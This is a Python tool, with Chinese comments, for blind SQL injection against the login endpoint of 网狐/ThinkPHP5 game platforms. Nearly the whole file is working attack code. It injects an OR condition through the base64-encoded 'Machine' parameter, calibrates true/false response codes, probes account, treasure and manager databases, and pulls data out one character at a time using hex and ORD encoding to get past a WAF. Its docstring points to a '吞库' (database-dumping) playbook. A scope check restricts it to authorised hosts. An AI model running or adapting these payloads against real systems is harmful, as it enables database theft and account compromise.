#!/usr/bin/env python3
"""网狐/TP5 登录盲注：payload 生成 + 授权内 L2 探针。

对齐 Playbook：传承/网狐·吞库.md

探表永远 SELECT 1。live 子命令走 scope_lib，禁止写死列名探表。
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import json
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = (
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
)
IDENT_TABLE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*\.[A-Za-z_][A-Za-z0-9_]*$")
IDENT_COL = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
STATUS_RE = re.compile(
    r"""['"](?:status|code)['"]\s*:\s*['"]?(-?\d+)['"]?""",
    re.I,
)
MSG_RE = re.compile(r"""['"]msg['"]\s*:\s*['"]((?:\\.|[^'"\\])*)['"]""")

COOKBOOK = [
    "QPAccountsDB.AccountsInfo",
    "QPAccountsDB.ConfineContent",
    "QPAccountsDB.ConfineMachine",
    "QPPlatformDB.DataBaseInfo",
    "QPPlatformDB.GameKindInfo",
    "QPPlatformDB.GameRoomInfo",
    "QPTreasureDB.GameScoreInfo",
    "QPTreasureDB.RecordDrawInfo",
    "QPPlatformManagerDB.Base_Users",
]



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "whgame_sqli"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围，拒绝请求")


def require_table(qualified: str) -> str:
    q = (qualified or "").strip()
    if not IDENT_TABLE.match(q):
        raise SystemExit(f"非法 db.table（只允许 Ident.Ident）：{qualified!r}")
    return q


def require_col(col: str) -> str:
    c = (col or "").strip()
    if not IDENT_COL.match(c):
        raise SystemExit(f"非法列名（只允许 Ident）：{col!r}")
    return c


def to_hex(s: str) -> str:
    return s.encode("utf-8").hex()


def hex_like(prefix: str, both_sides: bool = False) -> str:
    """默认 prefix%（0x<hex>25）。--both 才是 %prefix%。实战主用后缀。"""
    body = to_hex(prefix) + "25"
    if both_sides:
        body = "25" + body
    return f"0x{body}"


def hex_num(n: int) -> str:
    if n < 0:
        raise SystemExit("hex-num 只接受非负整数")
    return hex(n)


def exists_table(qualified: str) -> str:
    t = require_table(qualified)
    return f"EXISTS(SELECT 1 FROM {t} WHERE 1=1 LIMIT 1)"


def exists_col(qualified: str, col: str) -> str:
    t = require_table(qualified)
    c = require_col(col)
    return f"EXISTS(SELECT 1 FROM {t} WHERE {c} IS NOT NULL LIMIT 1)"


def prefix_like(qualified: str, col: str, prefix: str) -> str:
    t = require_table(qualified)
    c = require_col(col)
    return f"EXISTS(SELECT 1 FROM {t} WHERE {c} LIKE {hex_like(prefix)} LIMIT 1)"


def range_hex(qualified: str, col: str, lo: int, hi: int) -> str:
    t = require_table(qualified)
    c = require_col(col)
    return (
        f"EXISTS(SELECT 1 FROM {t} WHERE {c}>={hex_num(lo)} "
        f"AND {c}<={hex_num(hi)} LIMIT 1)"
    )


def ord_eq(qualified: str, col: str, pos: int, ch: str) -> str:
    t = require_table(qualified)
    c = require_col(col)
    if pos < 1:
        raise SystemExit("ord-eq pos 从 1 起")
    if len(ch) != 1:
        raise SystemExit("ord-eq 只要单字符")
    return f"EXISTS(SELECT 1 FROM {t} WHERE ORD(SUBSTR({c},{pos},1))={hex_num(ord(ch))} LIMIT 1)"


def machine_or(cond: str) -> str:
    return f"mach1' OR ({cond})='1"


def encode_data(plain: str, cond: str) -> str:
    if "{INJECT}" not in plain:
        raise SystemExit("--plain 必须含 {INJECT} 占位（会替换为 Machine 注入片段）")
    filled = plain.replace("{INJECT}", machine_or(cond))
    raw = base64.b64encode(filled.encode("utf-8")).decode("ascii")
    return urllib.parse.quote(raw, safe="")


def extract_biz(body: str) -> dict[str, Any]:
    sm = STATUS_RE.search(body or "")
    mm = MSG_RE.search(body or "")
    msg = ""
    if mm:
        msg = mm.group(1).replace('\\"', '"').replace("\\'", "'")[:80]
    return {
        "biz_status": int(sm.group(1)) if sm else None,
        "msg": (msg or "")[:80],
    }


def ssl_ctx(insecure: bool) -> ssl.SSLContext:
    if insecure:
        return ssl._create_unverified_context()
    return ssl.create_default_context()


def http_hit(
    url: str,
    data_q: str,
    *,
    timeout: int,
    insecure: bool,
    extra_query: str = "",
) -> dict[str, Any]:
    parts = urllib.parse.urlsplit(url)
    q = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
    if extra_query:
        q.update(dict(urllib.parse.parse_qsl(extra_query, keep_blank_values=True)))
    q["data"] = urllib.parse.unquote(data_q)
    # quote 不用 quote_plus，避免 base64 里的 + 被服务器当空格
    new_q = urllib.parse.urlencode(q, doseq=True, quote_via=urllib.parse.quote)
    full = urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path or "/", new_q, parts.fragment))
    req = urllib.request.Request(full, headers={"User-Agent": UA, "Accept": "*/*"}, method="GET")
    try:
        with urllib.request.urlopen(req, context=ssl_ctx(insecure), timeout=timeout) as r:
            raw = r.read()[:200_000]
            body = raw.decode("utf-8", "replace")
            http_status = r.status
    except urllib.error.HTTPError as e:
        raw = e.read()[:80_000] if e.fp else b""
        body = raw.decode("utf-8", "replace")
        http_status = e.code
    except Exception as e:
        return {
            "http": 0,
            "error": str(e),
            "len": 0,
            "sha1": "",
            "biz_status": None,
            "msg": "",
            "body_head": "",
        }
    biz = extract_biz(body)
    return {
        "http": http_status,
        "error": "",
        "len": len(raw),
        "sha1": hashlib.sha1(raw).hexdigest()[:16],
        "biz_status": biz["biz_status"],
        "msg": biz["msg"],
        "body_head": body[:240],
    }


def classify(biz: int | None, oracle: dict[str, int | None]) -> str:
    if biz is None:
        return "unknown"
    if oracle.get("true") is not None and biz == oracle["true"]:
        return "true"
    if oracle.get("false") is not None and biz == oracle["false"]:
        return "false"
    if oracle.get("error") is not None and biz == oracle["error"]:
        return "error"
    return f"other:{biz}"


def _plain_arg(args: argparse.Namespace) -> str:
    if not args.plain:
        raise SystemExit("live 探测必须 --plain '...{INJECT}...'（用已逆向可工作的参数串，勿抄上一站盐）")
    return args.plain


def cmd_oracle(args: argparse.Namespace) -> int:
    ensure_scope(args.url)
    plain = _plain_arg(args)
    pairs = [
        ("true", "1=1"),
        ("false", "1=2"),
        ("error", "1="),
    ]
    rows = {}
    for name, cond in pairs:
        data_q = encode_data(plain, cond)
        hit = http_hit(args.url, data_q, timeout=args.timeout, insecure=args.insecure, extra_query=args.extra)
        rows[name] = {"cond": cond, **hit}
        print(
            f"  [{name}] biz={hit.get('biz_status')} http={hit.get('http')} "
            f"len={hit.get('len')} msg={hit.get('msg')!r} err={hit.get('error')!r}"
        )
    oracle = {
        "true": rows["true"].get("biz_status"),
        "false": rows["false"].get("biz_status"),
        "error": rows["error"].get("biz_status"),
    }
    ok = (
        oracle["true"] is not None
        and oracle["false"] is not None
        and oracle["true"] != oracle["false"]
    )
    report = {
        "ts": _now(),
        "url": args.url,
        "ok": ok,
        "oracle": oracle,
        "rows": rows,
        "note": "ok=真假 biz_status 成对且不同。1010/10477 只是样例，以本站为准。",
    }
    path = case_dir(args.case) / "oracle.json"
    path.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"[{'ok' if ok else 'fail'}] oracle={oracle} -> {path}")
    return 0 if ok else 2


def cmd_map(args: argparse.Namespace) -> int:
    ensure_scope(args.url)
    plain = _plain_arg(args)
    oracle_path = case_dir(args.case) / "oracle.json"
    if args.oracle_json:
        oracle_path = Path(args.oracle_json)
    if not oracle_path.is_file():
        raise SystemExit(f"先跑 oracle 或 --oracle-json：缺少 {oracle_path}")
    prev = json.loads(oracle_path.read_text(encoding="utf-8"))
    oracle = prev.get("oracle") or {}
    tables = [x.strip() for x in (args.tables or "").split(",") if x.strip()] or list(COOKBOOK)
    results = []
    for t in tables:
        cond = exists_table(t)
        hit = http_hit(
            args.url,
            encode_data(plain, cond),
            timeout=args.timeout,
            insecure=args.insecure,
            extra_query=args.extra,
        )
        verdict = classify(hit.get("biz_status"), oracle)
        row = {"table": t, "cond": cond, "verdict": verdict, **hit}
        results.append(row)
        print(f"  [{verdict}] {t}  biz={hit.get('biz_status')} msg={hit.get('msg')!r}")
    report = {
        "ts": _now(),
        "url": args.url,
        "oracle": oracle,
        "results": results,
        "note": "true=可读；false=无表或无行或 GRANT 拒（Manager 假常是边界）；error=语法/WAF",
    }
    path = case_dir(args.case) / "db_map.json"
    path.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    readable = sum(1 for r in results if r["verdict"] == "true")
    print(f"[ok] readable={readable}/{len(results)} -> {path}")
    return 0


def cmd_check(args: argparse.Namespace) -> int:
    ensure_scope(args.url)
    plain = _plain_arg(args)
    cond = args.cond
    if args.exists:
        cond = exists_table(args.exists)
    elif args.prefix:
        table, col, pref = args.prefix
        cond = prefix_like(table, col, pref)
    if not cond:
        raise SystemExit("check 需要 --cond 或 --exists db.table 或 --prefix db.table col pref")
    hit = http_hit(
        args.url,
        encode_data(plain, cond),
        timeout=args.timeout,
        insecure=args.insecure,
        extra_query=args.extra,
    )
    print(json.dumps({"cond": cond, **hit}, ensure_ascii=False, indent=2))
    if args.case:
        path = case_dir(args.case) / "check.jsonl"
        with path.open("a", encoding="utf-8") as f:
            f.write(json.dumps({"ts": _now(), "cond": cond, **hit}, ensure_ascii=False) + "\n")
        print(f"[ok] append {path}")
    return 0


def cmd_selftest(_: argparse.Namespace) -> int:
    checks = [
        (hex_like("game"), "0x67616d6525"),
        (hex_like("001400"), "0x30303134303025"),
        (hex_like("172.31."), "0x3137322e33312e25"),
        (hex_num(9000), "0x2328"),
        (hex_num(1000), "0x3e8"),
        (hex_num(9999), "0x270f"),
        (
            exists_table("QPPlatformDB.DataBaseInfo"),
            "EXISTS(SELECT 1 FROM QPPlatformDB.DataBaseInfo WHERE 1=1 LIMIT 1)",
        ),
        (
            prefix_like("QPPlatformDB.DataBaseInfo", "DBUser", "game"),
            "EXISTS(SELECT 1 FROM QPPlatformDB.DataBaseInfo WHERE DBUser LIKE 0x67616d6525 LIMIT 1)",
        ),
    ]
    bad = 0
    for got, want in checks:
        if got != want:
            print(f"[fail] {got!r} != {want!r}")
            bad += 1
    try:
        exists_table("AccountsInfo")
        print("[fail] 单段表名应拒绝")
        bad += 1
    except SystemExit:
        pass
    try:
        exists_table("QP.DB;DROP")
        print("[fail] 分号应拒绝")
        bad += 1
    except SystemExit:
        pass
    enc = encode_data("Machine={INJECT}&protocal=167", "1=1")
    decoded = base64.b64decode(urllib.parse.unquote(enc)).decode("utf-8")
    if "mach1' OR (1=1)='1" not in decoded:
        print(f"[fail] encode 信封坏了: {decoded!r}")
        bad += 1
    biz = extract_biz('{"status":1010,"msg":"该机器码已绑定其他账号"}')
    if biz["biz_status"] != 1010 or "机器码" not in biz["msg"]:
        print(f"[fail] extract_biz {biz!r}")
        bad += 1
    biz2 = extract_biz("{'status': 10477, 'msg': '账号或密码错误'}")
    if biz2["biz_status"] != 10477:
        print(f"[fail] extract_biz single-quote {biz2!r}")
        bad += 1
    if bad:
        print(f"[fail] selftest {bad} failed")
        return 2
    print("[ok] selftest hex/ident/encode")
    return 0


def _h(s: str) -> str:
    """argparse 把 % 当格式符；帮助里一律写成 %%。"""
    return s.replace("%", "%%")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description=_h("网狐盲注助手：生成 payload + 授权内 oracle/map"))
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("hex-like", help=_h("字符串 → LIKE 0x..25（后缀 %）"))
    s.add_argument("prefix")
    s.add_argument("--both", action="store_true", help=_h("两侧 %（默认只有后缀）"))

    s = sub.add_parser("hex-num", help="整数 → 0x..")
    s.add_argument("n", type=int)

    s = sub.add_parser("exists", help="探表 SELECT 1")
    s.add_argument("table", help="db.table")

    s = sub.add_parser("exists-col", help="表已在后证列")
    s.add_argument("table")
    s.add_argument("col")

    s = sub.add_parser("prefix", help="列前缀 LIKE hex")
    s.add_argument("table")
    s.add_argument("col")
    s.add_argument("prefix")

    s = sub.add_parser("range", help="数字列 hex 区间")
    s.add_argument("table")
    s.add_argument("col")
    s.add_argument("lo", type=int)
    s.add_argument("hi", type=int)

    s = sub.add_parser("ord-eq", help="ORD(SUBSTR) 单字符（WAF 禁 ASCII）")
    s.add_argument("table")
    s.add_argument("col")
    s.add_argument("pos", type=int)
    s.add_argument("ch")

    s = sub.add_parser("wrap", help="包成 Machine 注入片段")
    s.add_argument("cond")

    s = sub.add_parser("encode", help="plain+cond → URL 的 data= 值")
    s.add_argument("cond")
    s.add_argument("--plain", required=True, help="含 {INJECT} 的参数串")
    s.add_argument("--url", default="", help="若给则打印完整 GET")

    s = sub.add_parser("cookbook", help="打印四库 SELECT 1 清单")
    s = sub.add_parser("selftest", help="对照本轮已验证 hex 向量")

    def live_flags(sp: argparse.ArgumentParser) -> None:
        sp.add_argument("--url", required=True)
        sp.add_argument("--plain", required=True, help="可工作参数串，Machine 处写 {INJECT}")
        sp.add_argument("--case", required=True)
        sp.add_argument("--extra", default="", help="附加 query")
        sp.add_argument("--timeout", type=int, default=20)
        sp.add_argument("--insecure", action="store_true")

    s = sub.add_parser("oracle", help="授权站标定真/假/错三码")
    live_flags(s)

    s = sub.add_parser("map", help="授权站四库 SELECT 1 地图（需先 oracle）")
    live_flags(s)
    s.add_argument("--tables", default="", help="逗号分隔 db.table，默认 cookbook")
    s.add_argument("--oracle-json", default="")

    s = sub.add_parser("check", help="授权站单条条件（存在性/前缀，不拉全表）")
    live_flags(s)
    s.add_argument("--cond", default="")
    s.add_argument("--exists", default="")
    s.add_argument("--prefix", nargs=3, metavar=("TABLE", "COL", "PREF"))
    return p


def main() -> int:
    args = build_parser().parse_args()
    if args.cmd == "hex-like":
        print(hex_like(args.prefix, both_sides=args.both))
    elif args.cmd == "hex-num":
        print(hex_num(args.n))
    elif args.cmd == "exists":
        print(exists_table(args.table))
    elif args.cmd == "exists-col":
        print(exists_col(args.table, args.col))
    elif args.cmd == "prefix":
        print(prefix_like(args.table, args.col, args.prefix))
    elif args.cmd == "range":
        print(range_hex(args.table, args.col, args.lo, args.hi))
    elif args.cmd == "ord-eq":
        print(ord_eq(args.table, args.col, args.pos, args.ch))
    elif args.cmd == "wrap":
        print(machine_or(args.cond))
    elif args.cmd == "encode":
        q = encode_data(args.plain, args.cond)
        if args.url:
            print(f"{args.url.rstrip('/')}/?data={q}")
        else:
            print(q)
    elif args.cmd == "cookbook":
        for t in COOKBOOK:
            print(exists_table(t))
    elif args.cmd == "selftest":
        return cmd_selftest(args)
    elif args.cmd == "oracle":
        return cmd_oracle(args)
    elif args.cmd == "map":
        return cmd_map(args)
    elif args.cmd == "check":
        return cmd_check(args)
    else:
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
